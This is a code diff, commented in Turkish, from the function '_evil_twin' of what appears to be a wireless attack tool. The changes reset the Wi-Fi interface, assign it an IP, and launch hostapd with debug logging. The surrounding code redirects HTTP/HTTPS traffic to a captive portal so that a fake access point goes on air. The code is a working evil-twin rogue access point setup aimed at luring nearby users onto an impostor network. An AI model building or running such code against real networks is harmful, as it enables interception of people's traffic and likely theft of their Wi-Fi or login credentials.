@@ -993,28 +993,47 @@ def _evil_twin(ap):
         success(f"iptables: HTTP/HTTPS → port {portal_port} yönlendirildi.")
 
     # ── ADIM 7: hostapd başlat (doğrudan subprocess — kontrollü) ─────
+   # wlan0 managed moda al (hostapd nl80211 için managed ister)
+    subprocess.run(["sudo", "airmon-ng", "stop", INTERFACE], capture_output=True)
+    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "down"], capture_output=True)
+    subprocess.run(["sudo", "iwconfig", INTERFACE, "mode", "managed"],  capture_output=True)
+    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"], capture_output=True)
+    subprocess.run(["sudo", "rfkill", "unblock", "wifi"], capture_output=True)
+    # IP'yi yeniden ata (mod değişince sıfırlanıyor)
+    subprocess.run(["sudo", "ip", "addr", "flush", "dev", INTERFACE], capture_output=True)
+    subprocess.run(["sudo", "ip", "addr", "add", "192.168.66.1/24", "dev", INTERFACE],
+                   capture_output=True)
+    time.sleep(1)
+
     status(f"hostapd başlatılıyor → SSID: [cyan]{essid}[/]  Kanal: [cyan]{channel}[/]")
+
+    # stderr'i de stdout'a yönlendir — boş hata mesajı sorununu çözer
     hostapd_proc = subprocess.Popen(
-        ["sudo", "hostapd", conf_path],
-        stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        ["sudo", "hostapd", "-dd", conf_path],
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT
     )
 
-    # AP-ENABLED sinyali gelene kadar bekle (max 10 sn)
     hostapd_ready = False
-    deadline = time.time() + 10
+    deadline = time.time() + 15
     while time.time() < deadline:
         line = hostapd_proc.stdout.readline().decode(errors="replace")
-        if "AP-ENABLED" in line or f"{INTERFACE}: interface state" in line:
+        if not line:
+            break
+        # Debug çıktısını terminale yansıt (sorun tespiti için)
+        if any(kw in line for kw in ["ERROR", "error", "Failed", "failed", "Cannot", "reason"]):
+            warn(f"hostapd: {line.strip()}")
+        if "AP-ENABLED" in line or "interface state ENABLED" in line:
             hostapd_ready = True
             break
         if hostapd_proc.poll() is not None:
-            err = hostapd_proc.stderr.read().decode(errors="replace")
-            error(f"hostapd başlatılamadı:\n{err[:600]}")
+            # Kalan çıktıyı oku
+            rest = hostapd_proc.stdout.read().decode(errors="replace")
+            error(f"hostapd çöktü. Son çıktı:\n{(line + rest)[-800:]}")
             subprocess.run(["sudo", "ip", "addr", "flush", "dev", INTERFACE], capture_output=True)
             subprocess.run(["sudo", "nmcli", "device", "set", INTERFACE, "managed", "yes"],
                            capture_output=True)
             return
-        time.sleep(0.2)
+        time.sleep(0.1)
 
     if hostapd_ready:
         success(f"[bold green]hostapd aktif[/] → Sahte AP yayında: [cyan]{essid}[/]")
